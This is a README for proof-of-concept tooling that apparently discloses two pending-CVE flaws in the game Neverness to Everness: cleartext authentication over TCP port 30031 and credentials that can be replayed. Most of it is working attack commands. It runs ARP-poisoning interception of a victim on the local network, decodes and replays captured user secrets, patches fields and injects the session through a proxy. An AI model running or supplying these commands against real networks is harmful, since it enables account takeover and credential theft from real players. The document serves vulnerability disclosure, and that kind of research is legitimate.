# NTE Account Takeover PoC

Proof-of-concept tooling for two zero-day vulnerabilities discovered in [Neverness to Everness (NTE)](https://nte.perfectworld.com/en/) by Perfect World / Hotta Studio.

- **CVE Pending:** Cleartext Transmission of Sensitive Information (CWE-319)
- **CVE Pending:** Insufficient Session Expiration (CWE-613)

For the full details, read my blogpost [here](https://hunio.org/security/nte-account-takeover)!

## Overview

NTE transmits authentication data in plaintext over TCP port `30031` using [Google FlatBuffers](https://flatbuffers.dev/). The authentication data includes a User ID and User Secret that lack any form of replay protection.

An attacker on the same network as a victim can perform a man-in-the-middle attack via ARP poisoning to capture this data, replay it from any system at any time, and inject it into their own authentication flow to play the game as the victim.

## Demo video

https://github.com/user-attachments/assets/f4d23525-5b0f-4de9-ae06-74bfeca7c3d5

## Requirements

- Python 3.10+
- `arpspoof` (from `dsniff`)
- `tshark` (from `wireshark`)

```
sudo apt install dsniff wireshark-common
```

## Usage

### Capture authentication data via ARP poisoning - writes captured authentication data to `capture.bin`
```
sudo python3 poc.py mitm -i eth0 -t <VICTIM_IP> -g <GATEWAY_IP>
```

### Decode a captured FlatBuffers blob
```
python3 poc.py decode <HEX>
```

### Replay captured authentication data
```
python3 poc.py auth <HEX>
```

### Patch fields in a captured blob (offline)
```
python3 poc.py patch <HEX> 0xOFFSET=VALUE ...
```

### Session injection via proxy
```
sudo python3 poc.py proxy -i eth0 -t <VICTIM_IP> -g <GATEWAY_IP> 0x014c=<USER_SECRET> 0x0178=<USER_ID>
```
